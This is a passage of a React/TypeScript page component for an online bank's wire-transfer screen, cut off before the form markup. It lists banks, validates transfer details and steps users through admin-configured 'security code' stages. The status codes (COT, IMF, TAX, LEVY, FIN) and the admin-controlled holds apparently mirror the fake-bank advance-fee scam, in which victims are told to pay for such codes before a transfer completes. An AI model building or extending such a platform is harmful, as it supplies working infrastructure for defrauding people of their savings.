/* eslint-disable react-hooks/exhaustive-deps */
import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useSiteSettings } from "@/hooks/useSiteSettings";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectGroup, SelectItem, SelectLabel, SelectSeparator, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { useToast } from "@/hooks/use-toast";
import { ArrowLeft, CheckCircle2, Globe, Check, Ban, Trash2 } from "lucide-react";
import { z } from "zod";
import DashboardLayout from "@/components/DashboardLayout";
import { isMissingWireTransferAccessColumnError } from "@/lib/supabaseErrors";
import { TransactionGate } from "@/components/TransactionGate";
import { useUserAccounts } from "@/hooks/useUserAccounts";
import { isAccountUsable, getAccountStatusLabel } from "@/lib/accountStatus";
import {
  DEFAULT_BUTTON_TEXT,
  DEFAULT_CODE_LABEL,
  normalizeVerificationSteps,
  visibleVerificationSteps,
  type WireTransferVerificationStep,
} from "@/lib/wireTransferVerification";

const CANADIAN_BANKS = [
  "Scotiabank (Bank of Nova Scotia)",
  "Bank of Montreal (BMO)",
  "Royal Bank of Canada (RBC)",
  "TD Canada Trust (Toronto-Dominion Bank)",
  "Canadian Imperial Bank of Commerce (CIBC)",
  "National Bank of Canada",
  "Desjardins Group",
  "Tangerine Bank",
  "Simplii Financial",
  "EQ Bank (Equitable Bank)",
  "Laurentian Bank of Canada",
  "Canadian Western Bank (CWB)",
  "ATB Financial",
  "Manulife Bank of Canada",
  "HSBC Bank Canada",
  "Vancity (Vancouver City Savings Credit Union)",
  "Meridian Credit Union",
  "Coast Capital Savings",
  "Wealthsimple",
];

const USA_BANKS = [
  "JPMorgan Chase Bank",
  "Bank of America",
  "Wells Fargo Bank",
  "Citibank",
  "U.S. Bank",
  "Capital One",
  "PNC Bank",
  "Truist Bank",
  "Goldman Sachs Bank",
  "Morgan Stanley Bank",
  "TD Bank (USA)",
  "Citizens Bank",
  "Fifth Third Bank",
  "M&T Bank",
  "KeyBank",
  "Huntington National Bank",
  "Regions Bank",
  "Ally Bank",
  "Charles Schwab Bank",
  "Discover Bank",
  "American Express National Bank",
  "BMO Bank (USA)",
  "First National Bank of Omaha",
  "Synchrony Bank",
  "Comerica Bank",
  "Zions Bank",
  "First Horizon Bank",
  "Santander Bank (USA)",
];

const wireTransferSchema = z.object({
  beneficiaryName: z.string().min(2, "Name must be at least 2 characters"),
  beneficiaryAccount: z.string().min(5, "Account number is required"),
  beneficiaryBank: z.string().min(2, "Bank name is required"),
  beneficiaryCountry: z.string().min(2, "Country is required"),
  swiftCode: z.string().min(8, "Valid SWIFT code required"),
  amount: z.number().min(1, "Amount must be greater than 0"),
  purpose: z.string().optional(),
});

type WireTransferRow = {
  id: string;
  user_id: string;
  account_id: string;
  beneficiary_name: string;
  beneficiary_account: string;
  beneficiary_bank: string;
  beneficiary_country: string;
  swift_code: string | null;
  amount: number;
  currency: string | null;
  purpose: string | null;
  status: string;
  current_stage: number | null;
  transaction_id: string | null;
  created_at: string | null;
  updated_at: string | null;
};

const INITIAL_TRANSFER_DATA = {
  beneficiaryName: "",
  beneficiaryAccount: "",
  beneficiaryBank: "",
  beneficiaryCountry: "",
  swiftCode: "",
  amount: "",
  purpose: "",
};

const PENDING_WIRE_TRANSFER_STATUSES = [
  "pending",
  "verification_pending",
  "awaiting_cot",
  "awaiting_imf",
  "awaiting_tax",
  "awaiting_levy",
  "awaiting_fin",
  "processing",
  "held",
  "suspended",
];

const WireTransfer = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const siteSettings = useSiteSettings();
  const verificationDisplayMode = siteSettings.wire_transfer_verification_display_mode === "show_all" ? "show_all" : "sequential";
  const showAllVerificationSteps = verificationDisplayMode === "show_all";
  const showNoticeBanner = siteSettings.wire_transfer_show_important_notice === "true";
  const [loading, setLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [verificationSteps, setVerificationSteps] = useState<WireTransferVerificationStep[]>([]);
  const [wireTransferId, setWireTransferId] = useState<string | null>(null);
  const [userId, setUserId] = useState<string | null>(null);
  const [accountId, setAccountId] = useState<string | null>(null);
  const [securityCodeInput, setSecurityCodeInput] = useState("");
  const [isBlocked, setIsBlocked] = useState(false);
  const [pendingTransfers, setPendingTransfers] = useState<WireTransferRow[]>([]);
  const [selectedTransfer, setSelectedTransfer] = useState<WireTransferRow | null>(null);
  const [isCustomBank, setIsCustomBank] = useState(false);
  const [actionModal, setActionModal] = useState<{
    type: "cancel" | "delete" | "stop";
    transfer: WireTransferRow;
  } | null>(null);
  const [actionLoading, setActionLoading] = useState(false);
  const { accounts, restrictedAccounts, hasUsableAccount, loading: accountsLoading } = useUserAccounts(userId);
  const [transferData, setTransferData] = useState({ ...INITIAL_TRANSFER_DATA });

  useEffect(() => {
    void loadInitialData();
  }, []);

  useEffect(() => {
    void loadVerificationSteps();
  }, []);

  useEffect(() => {
    if (!userId) return;

    const channel = supabase
      .channel(`wire-transfers-${userId}`)
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "wire_transfers", filter: `user_id=eq.${userId}` },
        (payload) => {
          const created = payload.new as WireTransferRow;
          if (!created) return;

          const isPending = PENDING_WIRE_TRANSFER_STATUSES.includes(created.status);
          if (isPending) {
            setPendingTransfers((existing) => [created, ...existing.filter((transfer) => transfer.id !== created.id)]);
          }
        }
      )
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "wire_transfers", filter: `user_id=eq.${userId}` },
        (payload) => {
          const updated = payload.new as WireTransferRow;
          if (!updated) return;

          setPendingTransfers((existing) => {
            const isPending = PENDING_WIRE_TRANSFER_STATUSES.includes(updated.status);
            const found = existing.find((transfer) => transfer.id === updated.id);
            if (isPending) {
              if (found) {
                return existing.map((transfer) => (transfer.id === updated.id ? updated : transfer));
              }
              return [updated, ...existing];
            }
            return existing.filter((transfer) => transfer.id !== updated.id);
          });

          if (updated.id === wireTransferId) {
            setSelectedTransfer(updated);
            setCurrentStep(updated.current_stage || 1);
          }
        }
      )
      .on(
        "postgres_changes",
        { event: "DELETE", schema: "public", table: "wire_transfers", filter: `user_id=eq.${userId}` },
        (payload) => {
          const deleted = payload.old as WireTransferRow;
          if (!deleted) return;

          setPendingTransfers((existing) => existing.filter((transfer) => transfer.id !== deleted.id));
          if (deleted.id === wireTransferId) {
            resetToNewWireTransfer();
          }
        }
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [userId, wireTransferId]);

  const loadVerificationSteps = async () => {
    const { data, error } = await supabase
      .from("wire_transfer_verification_steps")
      .select("*")
      .order("display_order", { ascending: true });

    if (!error && data) {
      setVerificationSteps(data as WireTransferVerificationStep[]);
    }
  };

  const loadPendingWireTransfers = async (userId: string) => {
    const { data, error } = await supabase
      .from("wire_transfers")
      .select("*")
      .eq("user_id", userId)
      .in("status", PENDING_WIRE_TRANSFER_STATUSES)
      .order("created_at", { ascending: false });

    if (!error && data) {
      setPendingTransfers(data as WireTransferRow[]);
    }
  };

  const loadInitialData = async () => {
    const { data: { user }, error } = await supabase.auth.getUser();
    
    if (error || !user) {
      navigate("/auth");
      return;
    }

    const { data: profile, error: profileError } = await supabase
      .from("profiles")
      .select("can_initiate_wire_transfer")
      .eq("id", user.id)
      .single();

    if (profileError && !isMissingWireTransferAccessColumnError(profileError)) {
      throw profileError;
    }

    if (profile && !profile.can_initiate_wire_transfer) {
      setIsBlocked(true);
      return;
    }

    setUserId(user.id);
    await loadPendingWireTransfers(user.id);
  };

  const resetToNewWireTransfer = () => {
    setSelectedTransfer(null);
    setWireTransferId(null);
    setCurrentStep(0);
    setAccountId(null);
    setTransferData({ ...INITIAL_TRANSFER_DATA });
    setSecurityCodeInput("");
    setIsCustomBank(false);
  };

  const selectPendingTransfer = (transfer: WireTransferRow) => {
    setSelectedTransfer(transfer);
    setWireTransferId(transfer.id);
    setCurrentStep(transfer.current_stage || 1);
    setSecurityCodeInput("");
  };

  const handleInitiateTransfer = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const validated = wireTransferSchema.parse({
        ...transferData,
        amount: parseFloat(transferData.amount),
      });

      const { data: { user }, error: authError } = await supabase.auth.getUser();
      if (authError || !user) throw new Error("Not authenticated");
      if (!accountId) throw new Error("Please select a source account");

      const { data: wireId, error } = await (supabase as unknown).rpc("initiate_wire_transfer", {
        p_account_id: accountId,
        p_beneficiary_name: validated.beneficiaryName,
        p_beneficiary_account: validated.beneficiaryAccount,
        p_beneficiary_bank: validated.beneficiaryBank,
        p_beneficiary_country: validated.beneficiaryCountry,
        p_swift_code: validated.swiftCode,
        p_amount: validated.amount,
        p_currency: "USD",
        p_purpose: validated.purpose || null,
      });

      if (error) throw error;

      if (wireId) {
        const newTransfer: WireTransferRow = {
          id: wireId,
          user_id: user.id,
          account_id: accountId,
          beneficiary_name: validated.beneficiaryName,
          beneficiary_account: validated.beneficiaryAccount,
          beneficiary_bank: validated.beneficiaryBank,
          beneficiary_country: validated.beneficiaryCountry,
          swift_code: validated.swiftCode,
          amount: validated.amount,
          currency: "USD",
          purpose: validated.purpose || null,
          status: "verification_pending",
          current_stage: 1,
          transaction_id: null,
          created_at: new Date().toISOString(),
          updated_at: new Date().toISOString(),
        };

        setWireTransferId(wireId);
        setSelectedTransfer(newTransfer);
        setCurrentStep(1);
        await loadPendingWireTransfers(user.id);

        toast({
          title: "Wire transfer initiated",
          description: "Please enter the security codes to proceed.",
        });
      }
    } catch (error: unknown) {
      if (error instanceof z.ZodError) {
        toast({
          title: "Validation Error",
          description: error.errors[0].message,
          variant: "destructive",
        });
      } else {
        toast({
          title: "Error",
          description: error instanceof Error ? error.message : "Unable to initiate wire transfer.",
          variant: "destructive",
        });
      }
    } finally {
      setLoading(false);
    }
  };

  const handleVerifyCode = async () => {
    if (!wireTransferId) return;
    if (selectedTransfer?.status === "held" || selectedTransfer?.status === "suspended") {
      toast({
        title: "Transfer paused",
        description: "This transfer has been placed on hold or suspended by the bank. Please wait for an admin to resume it.",
        variant: "destructive",
      });
      return;
    }
    if (selectedTransfer?.status === "cancelled" || selectedTransfer?.status === "rejected" || selectedTransfer?.status === "completed" || selectedTransfer?.status === "failed") {
      toast({
        title: "Transfer cannot continue",
        description: "This wire transfer has been finalized and cannot be resumed.",
        variant: "destructive",
      });
      return;
    }

    setLoading(true);

    try {
      const visibleSteps = visibleVerificationSteps(verificationSteps);
      const currentStepIndex = visibleSteps.findIndex((step) => step.display_order === currentStep);
      const currentStageCode =
        currentStepIndex >= 0
          ? visibleSteps[currentStepIndex]
          : visibleSteps.find((step) => (step.display_order ?? 0) >= currentStep) || null;

      if (!currentStageCode) {
        throw new Error("Verification workflow is not configured.");
      }

      const { data: verified, error: verifyError } = await supabase.rpc(
        "verify_wire_transfer_code",
        {
          p_wire_transfer_id: wireTransferId,
          p_code_type: currentStageCode.step_code,
          p_code: securityCodeInput.trim(),
        }
      );

      if (verifyError) throw verifyError;

      if (!verified) {
        toast({
          title: "Invalid code",
          description: "The security code you entered is incorrect.",
          variant: "destructive",
        });
        setLoading(false);
        return;
      }

      const visibleStepIndex =
        currentStepIndex >= 0
          ? currentStepIndex
          : visibleSteps.findIndex((step) => (step.display_order ?? 0) >= currentStep);
      const isLastVisibleStep = visibleStepIndex === visibleSteps.length - 1;

      if (isLastVisibleStep) {
        toast({
          title: "Transfer completed!",
          description: "Your wire transfer has been successfully processed.",
        });

        await loadPendingWireTransfers(userId!);
        setTimeout(() => navigate("/dashboard"), 2000);
      } else {
        const nextVisibleStep = visibleSteps[visibleStepIndex + 1];
        const nextStage = nextVisibleStep?.display_order || currentStep + 1;
        setCurrentStep(nextStage);
        setSecurityCodeInput("");

        if (selectedTransfer) {
          setSelectedTransfer({ ...selectedTransfer, current_stage: nextStage });
        }

        toast({
          title: "Code verified",
          description: `Please enter the ${nextVisibleStep?.title || currentStageCode.title}.`,
        });
      }
    } catch (error: unknown) {
      toast({
        title: "Verification failed",
        description: error instanceof Error ? error.message : "Unable to verify code.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const activeVerificationSteps = normalizeVerificationSteps(verificationSteps);
  const visibleVerificationStepsOrdered = visibleVerificationSteps(verificationSteps);
  const currentVisibleStep =
    visibleVerificationStepsOrdered.find((step) => step.display_order === currentStep) ||
    visibleVerificationStepsOrdered.find((step) => (step.display_order ?? 0) >= currentStep) ||
    null;

  const getWireTransferReference = (transferId: string) => `WT-${transferId.slice(0, 8).toUpperCase()}`;

  const getVerificationStepTitle = (stage: number | null) => {
    if (!stage || stage <= 0) return "Not started";
    return (
      activeVerificationSteps.find((step) => step.display_order === stage)?.title ||
      visibleVerificationStepsOrdered.find((step) => (step.display_order ?? 0) >= stage)?.title ||
      `Step ${stage}`
    );
  };

  const getTransferStatusLabel = (status: string) => {
    const mapping: Record<string, string> = {
      pending: "Pending initiation",
      verification_pending: "Verification pending",
      awaiting_cot: "Awaiting COT",
      awaiting_imf: "Awaiting IMF",
      awaiting_tax: "Awaiting TAX",
      awaiting_levy: "Awaiting LEVY",
      awaiting_fin: "Awaiting FIN",
      processing: "Processing",
      held: "On Hold",
      suspended: "Suspended",
      completed: "Completed",
      failed: "Failed",
      rejected: "Rejected",
      cancelled: "Cancelled",
    };

    return mapping[status] || status.replace(/_/g, " ").replace(/\b\w/g, (c) => c.toUpperCase());
  };

  const handleCancelWireTransfer = async (transfer: WireTransferRow) => {
    setActionLoading(true);
    try {
      // Try RPC first
      const { error: rpcError } = await (supabase as unknown as { rpc: (fn: string, params: Record<string, unknown>) => Promise<{ error: Error | null }> }).rpc(
        "cancel_user_wire_transfer",
        { p_wire_transfer_id: transfer.id }
      );

      if (rpcError) {
        // Fallback to direct update
        const { error: updateError } = await supabase
          .from("wire_transfers")
          .update({ status: "cancelled", updated_at: new Date().toISOString() })
          .eq("id", transfer.id);

        if (updateError) throw updateError;
      }

      toast({
        title: "Wire transfer cancelled",
        description: `Transfer ${getWireTransferReference(transfer.id)} to ${transfer.beneficiary_name} has been cancelled.`,
      });

      setPendingTransfers((prev) => prev.filter((t) => t.id !== transfer.id));

      if (selectedTransfer?.id === transfer.id) {
        resetToNewWireTransfer();
      }
    } catch (error: unknown) {
      toast({
        title: "Error cancelling transfer",
        description: error instanceof Error ? error.message : "Failed to cancel wire transfer.",
        variant: "destructive",
      });
    } finally {
      setActionLoading(false);
      setActionModal(null);
    }
  };

  const handleDeleteWireTransfer = async (transfer: WireTransferRow) => {
    setActionLoading(true);
    try {
      // Try RPC first
      const { error: rpcError } = await (supabase as unknown as { rpc: (fn: string, params: Record<string, unknown>) => Promise<{ error: Error | null }> }).rpc(
        "delete_user_wire_transfer",
        { p_wire_transfer_id: transfer.id }
      );

      if (rpcError) {
        // Fallback to direct delete
        const { error: deleteError } = await supabase
          .from("wire_transfers")
          .delete()
          .eq("id", transfer.id);

        if (deleteError) throw deleteError;
      }

      toast({
        title: "Wire transfer deleted",
        description: `Transfer ${getWireTransferReference(transfer.id)} has been permanently deleted.`,
      });

      setPendingTransfers((prev) => prev.filter((t) => t.id !== transfer.id));

      if (selectedTransfer?.id === transfer.id) {
        resetToNewWireTransfer();
      }
    } catch (error: unknown) {
      toast({
        title: "Error deleting transfer",
        description: error instanceof Error ? error.message : "Failed to delete wire transfer.",
        variant: "destructive",
      });
    } finally {
      setActionLoading(false);
      setActionModal(null);
    }
  };

  const isCreatingNewWireTransfer = selectedTransfer === null;
  const isTransferPaused = selectedTransfer?.status === "held" || selectedTransfer?.status === "suspended";
  const isTransferFinal = ["completed", "cancelled", "rejected", "failed"].includes(selectedTransfer?.status || "");
  const canContinueSelectedTransfer = !!selectedTransfer && !isTransferPaused && !isTransferFinal;

  if (isBlocked) {
    return (
      <DashboardLayout>
        <div className="p-8 text-center">
          <h1 className="text-2xl font-bold">Wire Transfers Blocked</h1>
          <p>Your ability to initiate wire transfers has been suspended. Please contact support for assistance.</p>
        </div>
      </DashboardLayout>
    );
  }

  return (
    <DashboardLayout>
    <div className="min-h-screen bg-[#F4F5F7] px-4 py-4 md:p-6">
      <header className="hidden rounded-xl border-0 bg-white shadow-sm md:block">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center space-x-4">
            <Button variant="ghost" size="icon" onClick={() => navigate("/dashboard")}>
              <ArrowLeft className="w-5 h-5" />
            </Button>
            <div>
              <h1 className="text-2xl font-semibold text-[#0A1628] border-l-4 border-[#C9A84C] pl-3">Wire Transfer</h1>
              <p className="text-sm text-muted-foreground">International Money Transfer</p>
            </div>
          </div>
        </div>
      </header>

      <div className="container mx-auto max-w-4xl px-0 py-4 md:px-4 md:py-8">
        <div className="mb-6 flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
          <div>
            <h2 className="text-xl font-semibold text-[#0A1628]">
              {currentStep > 0 ? "Wire Transfer Verification" : "Wire Transfer Dashboard"}
            </h2>
            <p className="text-sm text-muted-foreground">
              {currentStep > 0
                ? "Complete security verification to process this wire transfer."
                : "Manage in-progress transfers or initiate a new international wire transfer."}
            </p>
          </div>
          {currentStep > 0 ? (
            <Button onClick={resetToNewWireTransfer} variant="outline" size="sm" className="h-10">
              <ArrowLeft className="w-4 h-4 mr-2" /> Start New Wire Transfer
            </Button>
          ) : (
            <Button onClick={resetToNewWireTransfer} className="h-11" size="lg">
              New Wire Transfer
            </Button>
          )}
        </div>

        {/* ======================================================== */}
        {/* CASE 1: PENDING / ACTIVE WIRE TRANSFER VERIFICATION FLOW */}
        {/* ======================================================== */}
        {currentStep > 0 ? (
          <TransactionGate loading={accountsLoading} hasUsableAccount={hasUsableAccount} restrictedAccounts={restrictedAccounts}>
            <div className="space-y-6">
              {/* 1. Active Transfer Details Card */}
              {selectedTransfer && (
                <Card className="rounded-xl border-0 bg-white p-6 shadow-sm">
                  <div className="flex flex-col gap-4 md:flex-row md:items-center md:justify-between border-b border-slate-100 pb-4 mb-4">
                    <div>
                      <div className="flex items-center gap-2">
                        <span className="text-xs uppercase font-bold tracking-wider text-slate-500">Active Transfer</span>
                        <span className="inline-flex items-center rounded-full bg-amber-50 border border-amber-200 px-2.5 py-0.5 text-xs font-semibold text-amber-800">
                          {getTransferStatusLabel(selectedTransfer.status)}
                        </span>
                      </div>
                      <h3 className="text-lg font-bold text-[#0A1628] mt-1">
                        {getWireTransferReference(selectedTransfer.id)}
                      </h3>
                    </div>
                    <div className="flex flex-wrap items-center gap-3">
                      <div className="text-left md:text-right">
                        <p className="text-xs uppercase tracking-wider text-slate-500">Transfer Amount</p>
                        <p className="text-2xl font-bold text-[#0A1628]">
                          ${selectedTransfer.amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                          <span className="text-xs font-normal text-muted-foreground ml-1">USD</span>
                        </p>
                      </div>
                      <div className="flex items-center gap-2 pt-1 sm:pt-0">
                        <Button
                          variant="outline"
                          size="sm"
                          className="border-amber-300 text-amber-800 hover:bg-amber-50 hover:text-amber-900"
                          onClick={() => setActionModal({ type: "cancel", transfer: selectedTransfer })}
                          disabled={actionLoading}
                        >
                          <Ban className="w-3.5 h-3.5 mr-1.5 text-amber-600" /> Cancel Transfer
                        </Button>
                        <Button
                          variant="outline"
                          size="sm"
                          className="border-red-200 text-red-600 hover:bg-red-50 hover:text-red-700"
                          onClick={() => setActionModal({ type: "delete", transfer: selectedTransfer })}
                          disabled={actionLoading}
                        >
                          <Trash2 className="w-3.5 h-3.5 mr-1.5 text-red-500" /> Delete Transfer
                        </Button>
                      </div>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                    <div className="space-y-1">
                      <p className="text-xs font-medium text-slate-500">Recipient</p>
                      <p className="font-semibold text-slate-900">{selectedTransfer.beneficiary_name}</p>
                    </div>
                    <div className="space-y-1">
                      <p className="text-xs font-medium text-slate-500">Beneficiary Bank</p>
                      <p className="font-semibold text-slate-900">{selectedTransfer.beneficiary_bank}</p>
                    </div>
                    <div className="space-y-1">
                      <p className="text-xs font-medium text-slate-500">Account / Country</p>
                      <p className="font-semibold text-slate-900">
                        {selectedTransfer.beneficiary_account} &bull; {selectedTransfer.beneficiary_country}
                      </p>
                    </div>
                    <div className="space-y-1">
                      <p className="text-xs font-medium text-slate-500">SWIFT / BIC</p>
                      <p className="font-semibold text-slate-900">{selectedTransfer.swift_code || "N/A"}</p>
                    </div>
                  </div>
                </Card>
              )}

              {/* 2. Security Verification Progress Card (One by One) */}
              {visibleVerificationStepsOrdered.length > 0 && (
                <Card className="rounded-xl border-0 bg-white p-6 shadow-sm">
                  <h3 className="font-bold mb-4 text-[#0A1628]">Security Verification Progress</h3>
                  <div className="space-y-3">
                    {(showAllVerificationSteps
                      ? visibleVerificationStepsOrdered
                      : currentVisibleStep
                      ? [currentVisibleStep]
                      : []
                    ).map((stage) => {
                      const stageIndex = visibleVerificationStepsOrdered.findIndex((s) => s.id === stage.id) + 1;
                      const isCompleted = (stage.display_order ?? 0) < currentStep;
                      const isActive = currentVisibleStep?.display_order === stage.display_order;
                      return (
                        <div key={stage.id} className="flex items-center space-x-3">
                          {isCompleted ? (
                            <span className="w-7 h-7 rounded-full bg-[var(--bank-gold)] text-[#0A1628] inline-flex items-center justify-center flex-shrink-0">
                              <Check className="w-4 h-4" />
                            </span>
                          ) : isActive ? (
                            <span className="w-7 h-7 rounded-full bg-[var(--bank-navy)] text-white inline-flex items-center justify-center text-xs font-semibold flex-shrink-0">
                              {stageIndex}
                            </span>
                          ) : (
                            <span className="w-7 h-7 rounded-full border border-[#D1D5DB] text-[#9CA3AF] inline-flex items-center justify-center text-xs font-semibold flex-shrink-0">
                              {stageIndex}
                            </span>
                          )}
                          <div>
                            <p className={`font-medium text-sm ${isActive ? "text-[var(--bank-navy)]" : "text-foreground"}`}>
                              {stage.title}
                            </p>
                            <p className="text-sm text-muted-foreground">{stage.description}</p>
                          </div>
                        </div>
                      );
                    })}
                  </div>
                </Card>
              )}

              {/* 3. Verification Code Entry Card */}
              <div className="space-y-4">
                {visibleVerificationStepsOrdered.length === 0 ? (
                  <div className="text-sm text-muted-foreground">Verification workflow not available.</div>
                ) : (
                  visibleVerificationStepsOrdered.map((stage) => {
                    const isCompleted = (stage.display_order ?? 0) < currentStep;
                    const isActive = currentVisibleStep?.display_order === stage.display_order;
                    const statusLabel = isCompleted ? "Completed" : isActive ? "Active" : "Pending";

                    if (!showAllVerificationSteps && !isActive) {
                      return null;
                    }

                    return (
                      <Card key={stage.id} className="rounded-xl border-0 bg-white p-8 shadow-sm">
                        <div className="mb-8 text-center">
                          <div className="flex items-center justify-center gap-2 mb-4">
                            <span
                              className={`inline-flex items-center rounded-full px-3 py-1 text-xs font-semibold ${
                                isCompleted
                                  ? "bg-emerald-100 text-emerald-700"
                                  : isActive
                                  ? "bg-[var(--bank-navy)] text-white"
                                  : "bg-slate-100 text-slate-700"
                              }`}
                            >
                              {statusLabel}
                            </span>
                          </div>
                          <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center mx-auto mb-4">
                            <Globe className="w-8 h-8 text-primary" />
                          </div>
                          <h2 className="text-2xl font-bold mb-2">{stage.title}</h2>
                          <p className="text-muted-foreground">{stage.description}</p>
                        </div>

                        {isActive ? (
                          <div className="max-w-md mx-auto space-y-6">
                            {showNoticeBanner && (stage.message_body || stage.message_title) ? (
                              <div
                                className="rounded-lg border-l-4 p-4"
                                style={{
                                  backgroundColor: stage.message_background_color || "#FFFBEB",
                                  borderColor: stage.message_border_color || "#F59E0B",
                                }}
                              >
                                <p className="mb-2 text-sm font-medium">
                                  {stage.message_title || "Important"}
                                </p>
                                <p className="text-sm">
                                  {stage.message_body || "This verification step is configured in the Admin CMS."}
                                </p>
                              </div>
                            ) : null}

                            {stage.requires_code !== false ? (
                              <div className="space-y-2">
                                <label className="text-sm font-medium">
                                  {stage.code_label || DEFAULT_CODE_LABEL}
                                </label>
                                <Input
                                  value={securityCodeInput}
                                  onChange={(e) => setSecurityCodeInput(e.target.value)}
                                  placeholder={stage.placeholder || `${stage.step_code}-XXXXXXXX`}
                                  className="h-14 text-center text-lg font-mono"
                                />
                              </div>
                            ) : (
                              <p className="text-sm text-muted-foreground">
                                No verification code is required for this step.
                              </p>
                            )}

                            <Button
                              onClick={handleVerifyCode}
                              size="lg"
                              className="w-full h-12 bg-[var(--bank-navy)] hover:bg-[var(--bank-slate)]"
                              disabled={loading || (stage.requires_code !== false && !securityCodeInput.trim())}
                            >
                              {loading ? "Verifying..." : stage.button_text || DEFAULT_BUTTON_TEXT}
                            </Button>
                          </div>
                        ) : isCompleted ? (
                          <div className="max-w-md mx-auto rounded-xl border border-emerald-200 bg-emerald-50 p-6 text-emerald-900">
                            <p className="font-semibold">This step has already been verified.</p>
                          </div>
                        ) : (
                          <div className="max-w-md mx-auto rounded-xl border border-slate-200 bg-slate-50 p-6 text-slate-700">
                            <p className="font-semibold">This step will unlock once prior verification steps are complete.</p>
                          </div>
                        )}
                      </Card>
                    );
                  })
                )}
              </div>

              {/* 4. Other Incomplete Transfers (if any) */}
              {pendingTransfers.filter((t) => t.id !== wireTransferId).length > 0 && (
                <Card className="rounded-xl border-0 bg-white p-6 shadow-sm mt-8">
                  <h3 className="font-bold mb-4 text-[#0A1628]">Other Incomplete Transfers</h3>
                  <div className="space-y-3">
                    {pendingTransfers
                      .filter((t) => t.id !== wireTransferId)
                      .map((transfer) => (
                        <div key={transfer.id} className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 rounded-lg border border-slate-200 bg-slate-50 p-4">
                          <div>
                            <p className="font-semibold text-sm">{getWireTransferReference(transfer.id)} — {transfer.beneficiary_name}</p>
                            <p className="text-xs text-slate-600">
                              Amount: ${transfer.amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })} &bull; Step: {getVerificationStepTitle(transfer.current_stage)}
                            </p>
                          </div>
                          <div className="flex items-center gap-2">
                            <Button size="sm" variant="outline" onClick={() => selectPendingTransfer(transfer)}>
                              Switch to this transfer
                            </Button>
                            <Button
                              size="sm"
                              variant="outline"
                              className="border-amber-300 text-amber-800 hover:bg-amber-50 hover:text-amber-900"
                              onClick={() => setActionModal({ type: "cancel", transfer })}
                              title="Cancel Transfer"
                              disabled={actionLoading}
                            >
                              <Ban className="w-3.5 h-3.5 sm:mr-1.5 text-amber-600" />
                              <span className="hidden sm:inline">Cancel</span>
                            </Button>
                            <Button
                              size="sm"
                              variant="outline"
                              className="border-red-200 text-red-600 hover:bg-red-50 hover:text-red-700"
                              onClick={() => setActionModal({ type: "delete", transfer })}
                              title="Delete Transfer"
                              disabled={actionLoading}
                            >
                              <Trash2 className="w-3.5 h-3.5 sm:mr-1.5 text-red-500" />
                              <span className="hidden sm:inline">Delete</span>
                            </Button>
                          </div>
                        </div>
                      ))}
                  </div>
                </Card>
              )}
            </div>
          </TransactionGate>
        ) : (
          /* ======================================================== */
          /* CASE 2: NEW WIRE TRANSFER DASHBOARD / INITIATE FLOW      */
          /* ======================================================== */
          <div className="space-y-8">
            {/* Incomplete Transfers List (if any exist) */}
            {pendingTransfers.length > 0 && (
              <Card className="rounded-xl border-0 bg-white p-6 shadow-sm">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="font-bold text-[#0A1628]">Incomplete Wire Transfers</h3>
                  <span className="text-xs font-semibold text-amber-700 bg-amber-50 px-2.5 py-1 rounded-full border border-amber-200">
                    {pendingTransfers.length} Pending
                  </span>
                </div>
                <div className="space-y-4">
                  {pendingTransfers.map((transfer) => (
                    <div key={transfer.id} className="rounded-xl border border-slate-200 bg-slate-50 p-4 md:p-6">
                      <div className="flex flex-col gap-4 md:flex-row md:items-center md:justify-between">
                        <div className="space-y-1.5">
                          <div className="flex items-center gap-2">
                            <span className="text-xs uppercase tracking-wider text-slate-500 font-semibold">Reference</span>
                            <span className="font-bold text-sm text-[#0A1628]">{getWireTransferReference(transfer.id)}</span>
                            <span className="inline-flex items-center rounded-full bg-amber-100 text-amber-800 px-2 py-0.5 text-xs font-medium">
                              {getTransferStatusLabel(transfer.status)}
                            </span>
                          </div>
                          <p className="text-sm text-slate-700 font-medium">
                            Recipient: {transfer.beneficiary_name} &bull; {transfer.beneficiary_bank}
                          </p>
                          <p className="text-sm text-slate-700 font-semibold text-primary">
                            Amount: ${transfer.amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                          </p>
                          <p className="text-xs text-slate-500">
                            Current required step: {getVerificationStepTitle(transfer.current_stage)}
                          </p>
                        </div>
                        <div className="flex flex-wrap items-center gap-2.5">
                          <Button size="default" className="bg-[var(--bank-navy)] text-white hover:bg-[var(--bank-slate)]" onClick={() => selectPendingTransfer(transfer)}>
                            Continue Transfer
                          </Button>
                          <Button
                            size="default"
                            variant="outline"
                            className="border-amber-300 text-amber-800 hover:bg-amber-50 hover:text-amber-900"
                            onClick={() => setActionModal({ type: "cancel", transfer })}
                            disabled={actionLoading}
                          >
                            <Ban className="w-4 h-4 mr-1.5 text-amber-600" /> Cancel
                          </Button>
                          <Button
                            size="default"
                            variant="outline"
                            className="border-red-200 text-red-600 hover:bg-red-50 hover:text-red-700"
                            onClick={() => setActionModal({ type: "delete", transfer })}
                            disabled={actionLoading}
                          >
                            <Trash2 className="w-4 h-4 mr-1.5 text-red-500" /> Delete
                          </Button>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </Card>
            )}

            {/* Initiate Wire Transfer Form */}
